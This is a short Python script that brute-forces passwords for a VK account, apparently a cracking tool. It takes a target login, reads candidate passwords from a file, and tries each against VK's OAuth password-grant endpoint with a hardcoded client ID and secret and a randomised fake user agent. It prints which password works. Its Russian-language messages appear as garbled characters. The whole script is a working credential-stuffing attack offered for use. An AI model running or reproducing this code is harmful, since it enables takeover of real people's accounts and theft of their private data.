import requests, fake_useragent, os
from termcolor import colored
user = fake_useragent.UserAgent().random
os.system("clear")
login = input(colored('������� �����:', 'yellow'))
print(colored('���� ������� !!!', 'green'))
headers = {'user_agent': user}
i=0
UsersId = open("baz.txt", "r")
UsersId2 = set()
for line in UsersId:
    UsersId2.add(line.strip())
UsersId.close()

suser = []
for user in UsersId2:
    suser.append(str(user))
if i == 0:
    for user in suser:

        ss = requests.get(f"https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username={login}&password={user}", headers=headers)
        if str(ss) == '<Response [200]>':
            print(colored(f'{user} �����!', 'green'))
            print(colored('�����!', 'green'))
            i = 1
        else:
            print(colored(f'{user} �� �����!', 'red'))

print(colored('���� �������� !!!', 'red'))

